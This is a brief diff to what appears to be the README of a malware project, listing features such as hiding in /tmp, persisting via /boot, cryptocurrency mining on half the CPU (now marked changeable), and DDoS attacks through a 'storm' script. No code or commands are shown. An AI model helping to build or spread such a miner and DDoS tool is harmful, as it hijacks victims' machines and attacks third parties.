@@ -6,7 +6,7 @@
 # Features
 * Hidden -> Works on /tmp directory
 * Startup -> Adds itself to /boot
-* Mining uses half of the CPU
+* Mining uses half of the CPU (changeable)
 * DDoS attack uses 'storm' script
 * Windows and Linux are supported platforms and tested
 
